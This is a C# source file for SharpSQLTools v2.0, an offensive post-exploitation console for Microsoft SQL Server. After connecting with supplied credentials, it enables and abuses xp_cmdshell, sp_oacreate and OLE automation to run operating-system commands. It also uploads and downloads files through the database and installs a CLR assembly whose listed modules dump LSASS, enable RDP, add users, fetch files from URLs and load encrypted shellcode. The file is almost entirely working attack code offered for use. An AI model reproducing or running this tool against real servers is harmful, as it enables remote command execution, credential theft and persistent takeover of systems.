﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Threading;

namespace SharpSQLTools
{
    class Program
    {
        static SqlConnection Conn;
        static Setting setting;
        static String sqlstr;

        private static void Help()
        {
            Console.WriteLine(@"
enable_xp_cmdshell         - you know what it means
disable_xp_cmdshell        - you know what it means
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
sp_oacreate {cmd}          - executes cmd using sp_oacreate
enable_ole                 - you know what it means
disable_ole                - you know what it means
upload {local} {remote}    - upload a local file to a remote path (OLE required)
download {remote} {local}  - download a remote file to a local path
enable_clr                 - you know what it means
disable_clr                - you know what it means
install_clr                - create assembly and procedure
uninstall_clr              - drop clr
clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files           
clr_dumplsass {path}       - dumplsass by clr
clr_rdp                    - check RDP port and Enable RDP
clr_getav                  - get anti-virus software on this machin by clr
clr_adduser {user} {pass}  - add user by clr
clr_download {url} {path}  - download file from url by clr
clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
clr_scloader1 {file} {key} - Encrypt Shellcode by Encrypt.py and Upload Payload.txt
clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader 
exit                       - terminates the server process (and this session)"
);
        }
        private static void logo()
        {
            Console.WriteLine(@"
   _____ _                      _____  ____  _   _______          _     
  / ____| |                    / ____|/ __ \| | |__   __|        | |    
 | (___ | |__   __ _ _ __ _ __| (___ | |  | | |    | | ___   ___ | |___ 
  \___ \| '_ \ / _` | '__| '_ \\___ \| |  | | |    | |/ _ \ / _ \| / __|
  ____) | | | | (_| | |  | |_) |___) | |__| | |____| | (_) | (_) | \__ \
 |_____/|_| |_|\__,_|_|  | .__/_____/ \___\_\______|_|\___/ \___/|_|___/    v2.0
                         | |                                            
                         |_|                              
                                                    by Rcoil & Uknow
");
        }

        /// <summary>
        /// xp_cmdshell 执行命令
        /// </summary>
        /// <param name="Command">命令</param>
        static void xp_shell(String Command)
        {
            if (setting.Check_configuration("xp_cmdshell", 0) && !setting.Enable_xp_cmdshell())
            {
                return;
            }
            sqlstr = String.Format("exec master..xp_cmdshell '{0}'", Command);
            Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
        }

        /// <summary>
        /// 获取当前时间戳
        /// </summary>
        public static string GetTimeStamp()
        {
            TimeSpan ts = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0);
            return Convert.ToInt64(ts.TotalMilliseconds).ToString();
        }

        /// <summary>
        /// sp_oacreate 执行命令
        /// </summary>
        /// <param name="Command">命令</param>
        static void sp_shell(String Command)
        {
            if (setting.Check_configuration("Ole Automation Procedures", 0) && !setting.Enable_ola())
            {
                return;
            }
            string sqlstr = String.Format(@"
                    declare @shell int,@exec int,@text int,@str varchar(8000); 
                    exec sp_oacreate 'wscript.shell',@shell output 
                    exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c {0}'
                    exec sp_oamethod @exec, 'StdOut', @text out;
                    exec sp_oamethod @text, 'ReadAll', @str out
                    select @str", Command);
            Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
        }

        /// <summary>
        /// clr_exec 执行命令
        /// </summary>
        /// <param name="Command">命令</param>
        static void clr_exec(String Command)
        {
            sqlstr = String.Format("exec dbo.ClrExec '{0}'", Command);
            Batch.CLRExec(Conn, sqlstr);
        }


        static byte[] ReadFileToByte(string filePath)
        {
            byte[] result;
            try
            {
                using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    byte[] array = new byte[fileStream.Length];
                    fileStream.Read(array, 0, array.Length);
                    result = array;
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }

        static private List<int> SplitFileSize(int fileSize, int splitLength)
        {
            List<int> list = new List<int>();
            if (fileSize > splitLength)
            {
                int num = fileSize / splitLength;
                int num2 = fileSize % splitLength;
                if (num > 0)
                {
                    for (int i = 0; i < num; i++)
                    {
                        list.Add(splitLength);
                    }
                    if (num2 != 0)
                    {
                        list.Add(num2);
                    }
                }
            }
            else
            {
                list.Add(fileSize);
            }
            return list;
        }

        /// <summary>
        /// 文件上传，使用 OLE Automation Procedures 的 ADODB.Stream
        /// </summary>
        /// <param name="localFile">本地文件</param>
        /// <param name="RemoteFile">远程文件</param>
        static void UploadFiles(String localFile, String remoteFile)
        {
            Console.WriteLine(String.Format("[*] Uploading '{0}' to '{1}'...", localFile, remoteFile));

            if (setting.Check_configuration("Ole Automation Procedures", 0) && !setting.Enable_ola())
            {
                 return;
            }
            byte[] byteArray = ReadFileToByte(localFile);
            string text = "copy /b ";
            if (setting.File_Exists(remoteFile, 1))
            {
                Console.WriteLine("[+] {0} Exists", remoteFile);
                return;
            }
            int num = 0;
            int num2 = 0;
            int splitLength = 250000;
            List<int> list = SplitFileSize(byteArray.Length, splitLength);
            try
            {
                foreach (int num3 in list)
                {
                    string text2 = string.Format("{0}_{1}.config_txt", remoteFile, num);
                    byte[] array = new byte[num3];
                    Array.Copy(byteArray, num2, array, 0, num3);
                    string hexstr = string.Concat(from b in array
                                                  select b.ToString("X2"));
                    sqlstr = String.Format(@"
                        DECLARE @ObjectToken INT
                        EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
                        EXEC sp_OASetProperty @ObjectToken, 'Type', 1
                        EXEC sp_OAMethod @ObjectToken, 'Open'
                        EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{0}
                        EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                        EXEC sp_OAMethod @ObjectToken, 'Close'
                        EXEC sp_OADestroy @ObjectToken", hexstr, text2);
                    Batch.RemoteExec(Conn, sqlstr, false);
                    num2 += num3;
                    num++;
                    text = text + "\"" + text2 + "\"+";
                    Thread.Sleep(1000);
                    if (setting.File_Exists(text2, 1))
                       {
                           Console.WriteLine("[+] {0}_{1}.config_txt Upload completed", remoteFile, num);
                       }
                       else
                       {
                           Console.WriteLine("[!] {0}_{1}.config_txt Error uploading", remoteFile, num);
                           Conn.Close();
                           Environment.Exit(0);
                       }

                    Thread.Sleep(1000);
                }

                text = text.Trim(new char[]
                {
                                    '+'
                }) + " \"" + remoteFile + "\"'";
                string shell = String.Format(@"
                    DECLARE @SHELL INT 
                    EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
                    EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");

                Console.WriteLine(@"[+] copy /b {0}_x.config_txt {0}", remoteFile);
                Batch.RemoteExec(Conn,shell + text, false);
                Thread.Sleep(1000);

                if (setting.File_Exists(remoteFile, 1))
                {
                    sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
                    Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
                    Batch.RemoteExec(Conn, shell + sqlstr, false);
                    Console.WriteLine("[*] '{0}' Upload completed", localFile);
                }
                //setting.Disable_ole();
            }
            catch (Exception ex)
            {
                Conn.Close();
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
            }
        }

        /// <summary>
        /// 文件下载，使用 OPENROWSET + BULK。将 memoryStream 直接写入文件
        /// </summary>
        /// <param name="remoteFile">远程文件</param>
        /// <param name="localFile">本地文件</param>
        static void DownloadFiles(String localFile, String remoteFile)
        {
            Console.WriteLine(String.Format("[*] Downloading '{0}' to '{1}'...", remoteFile, localFile));

            if (!setting.File_Exists(remoteFile, 1))
            {
                Console.WriteLine("[!] {0} file does not exist....", remoteFile);
                return;
            }

            sqlstr = String.Format(@"SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_BLOB) rs", remoteFile); // SINGLE_BLOB 选项将它们读取为二进制文件
            SqlCommand sqlComm = new SqlCommand(sqlstr, Conn);

            //接收查询到的sql数据
            using (SqlDataReader reader = sqlComm.ExecuteReader())
            {
                //读取数据 
                while (reader.Read())
                {
                    using (MemoryStream memoryStream = new MemoryStream((byte[])reader[0]))
                    {
                        using (FileStream fileStream = new FileStream(localFile, FileMode.Create, FileAccess.Write))
                        {
                            byte[] bytes = new byte[memoryStream.Length];
                            memoryStream.Read(bytes, 0, (int)memoryStream.Length);
                            fileStream.Write(bytes, 0, bytes.Length);
                        }
                    }
                }
            }

            Console.WriteLine("[*] '{0}' Download completed", remoteFile);
        }

        public static void OnInfoMessage(object mySender, SqlInfoMessageEventArgs args)
        {
            String value = String.Empty;
            foreach (SqlError err in args.Errors)
            {
                value = err.Message;
                Console.WriteLine(value);
            }
        }

        static void interactive(string[] args)
        {
            string target = args[0];
            if (target.Contains(":"))
            {
                target = target.Replace(":", ",");
            }
            string username = args[1];
            string password = args[2];
            string database = args[3];
            try
            {
                //sql建立连接
                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target, database, username, password);
                Conn = new SqlConnection(connectionString);
                Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                Conn.Open();
                Console.WriteLine("[*] Database connection is successful!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
                Environment.Exit(0);
            }

            setting = new Setting(Conn);

            try
            {
                do
                {
                    Console.Write("SQL> ");
                    string str = Console.ReadLine();
                    if (str.ToLower() == "exit") { Conn.Close(); break; }
                    else if (str.ToLower() == "help") { Help(); continue; }

                    string[] cmdline = str.Split(new char[] { ' ' }, 3);

                    switch (cmdline[0].ToLower())
                    {
                        case "enable_xp_cmdshell":
                            setting.Enable_xp_cmdshell();
                            break;
                        case "disable_xp_cmdshell":
                            setting.Disable_xp_cmdshell();
                            break;
                        case "xp_cmdshell":
                            {
                                String s = String.Empty;
                                for (int i = 1; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                xp_shell(s);
                                break;
                            }
                        case "sp_oacreate":
                            {
                                String s = String.Empty;
                                for (int i = 1; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                sp_shell(s);
                                break;
                            }
                        case "upload":
                            UploadFiles(cmdline[1], cmdline[2]);
                            break;
                        case "download":
                            DownloadFiles(cmdline[2], cmdline[1]);
                            break;
                        case "enable_ole":
                            setting.Enable_ola();
                            break;
                        case "disable_ole":
                            setting.Disable_ole();
                            break;
                        case "clr_dumplsass":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                           // clr_exec("clr_dumplsass");
                           // break;
                        case "clr_rdp":
                            clr_exec("clr_rdp");
                            break;
                        case "clr_getav":
                            clr_exec("clr_getav");
                            break;
                        case "clr_adduser":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_exec":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_scloader":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_scloader1":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_scloader2":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_download":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "clr_combine":
                            {
                                String s = String.Empty;
                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
                                clr_exec(s);
                                break;
                            }
                        case "enable_clr":
                            setting.Enable_clr();
                            break;
                        case "disable_clr":
                            setting.Disable_clr();
                            break;
                        case "install_clr":
                            {
                                setting.install_clr();
                                break;
                            }
                        case "uninstall_clr":
                            setting.drop_clr();
                            break;
                        default:
                            Console.WriteLine(Batch.RemoteExec(Conn, str, true));
                            break;

                    }
                    if (!ConnectionState.Open.Equals(Conn.State))
                    {
                        Console.WriteLine("[!] Disconnect....");
                        break;
                    }
                }
                while (true);
            }
            catch (Exception ex)
            {
                Conn.Close();
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
            }
        }

        static void Noninteractive(string[] args)
        {
            if (args.Length < 4)
            {
                Help();
                return;
            }
            string target = args[0];
            if (target.Contains(":"))
            {
                target = target.Replace(":", ",");
            }
            string username = args[1];
            string password = args[2];
            string database = args[3];
            string module = args[4];
            try
            {
                //sql建立连接
                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target, database, username, password);
                Conn = new SqlConnection(connectionString);
                Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                Conn.Open();
                Console.WriteLine("[*] Database connection is successful!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
                Environment.Exit(0);
            }

            setting = new Setting(Conn);
            try
            {
                // string[] cmdline = str.Split(new char[] { ' ' }, 3);

                switch (module.ToLower())
                {
                    case "enable_xp_cmdshell":
                        setting.Enable_xp_cmdshell();
                        break;
                    case "disable_xp_cmdshell":
                        setting.Disable_xp_cmdshell();
                        break;
                    case "xp_cmdshell":
                        {
                            String command = String.Empty;
                            if (args.Length > 6)
                            {
                                for (int i = 5; i < args.Length; i++) { command += args[i] + " "; }
                            }
                            else
                            {
                                command = args[5];
                            }
                            xp_shell(command);
                            break;
                        }
                    case "sp_oacreate":
                        {
                            {
                                String command = String.Empty;
                                if (args.Length > 6)
                                {
                                    for (int i = 5; i < args.Length; i++) { command += args[i] + " "; }
                                }
                                else
                                {
                                    command = args[5];
                                }
                                sp_shell(command);
                                break;
                            }
                        }
                    case "upload":
                        UploadFiles(args[5], args[6]);
                        break;
                    case "download":
                        DownloadFiles(args[6], args[5]);
                        break;
                    case "enable_ole":
                        setting.Enable_ola();
                        break;
                    case "disable_ole":
                        setting.Disable_ole();
                        break;
                    case "clr_dumplsass":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    //clr_exec("clr_dumplsass");
                    //break;
                    case "clr_rdp":
                        clr_exec("clr_rdp");
                        break;
                    case "clr_getav":
                        clr_exec("clr_getav");
                        break;
                    case "clr_adduser":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_exec":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_scloader":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_scloader1":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_scloader2":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_download":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "clr_combine":
                        {
                            String s = String.Empty;
                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                            clr_exec(s);
                            break;
                        }
                    case "enable_clr":
                        setting.Enable_clr();
                        break;
                    case "disable_clr":
                        setting.Disable_clr();
                        break;
                    case "install_clr":
                        {
                            setting.install_clr();
                            break;
                        }
                    case "uninstall_clr":
                        setting.drop_clr();
                        break;
                    default:
                        Console.WriteLine(Batch.RemoteExec(Conn, args[3], true));
                        break;

                }
                if (!ConnectionState.Open.Equals(Conn.State))
                {
                    Console.WriteLine("[!] Disconnect....");
                }
                Conn.Close();
            }
            catch (Exception ex)
            {
                Conn.Close();
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
            }
        }
        static void Main(string[] args)
        {
            if (args.Length == 4)
            {
                interactive(args);
            }
            else if (args.Length > 4)
            {
                Noninteractive(args);
            }
            else
            {
                logo();
                Console.WriteLine("Usage:");
                Console.WriteLine(@"
SharpSQLTools target username password database                   - interactive console
SharpSQLTools target username password database module command    - non-interactive console");
                Console.WriteLine("\nModule:");
                Help();
                return;
            }

        }
    }
}
